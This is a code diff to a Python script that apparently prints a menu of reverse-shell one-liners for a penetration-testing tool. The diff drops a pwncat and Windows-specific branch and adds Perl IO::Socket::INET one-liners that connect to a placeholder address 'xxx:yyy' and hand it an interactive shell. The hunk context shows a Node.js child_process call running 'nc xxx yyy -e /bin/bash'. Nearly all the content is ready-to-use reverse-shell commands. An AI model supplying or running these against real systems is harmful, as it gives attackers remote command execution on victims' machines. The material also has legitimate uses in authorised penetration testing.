@@ -275,21 +275,11 @@ x('child_process').exec('nc xxx yyy -e /bin/bash')
         )
     shells.append(
         r"""
-║ perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"xxx:yyy");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'"""
-    )
-    if pwncat:
-        shells.append(
-            """
+║ perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"xxx:yyy");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
+╠═══════════════════════════════════════════════════
+║ perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"xxx:yyy");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
 ╚═══════════════════════════════════════════════════"""
-        )
-    else:
-        shells.append(windows_color)
-        shells.append(
-            r"""
-╠══════════════╦════════════════════════════════════
-║ Windows only ║ perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"xxx:yyy");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
-╚══════════════╩════════════════════════════════════"""
-        )
+    )
     if not rlwrap:
         shells.append(linux_color)
         shells.append(
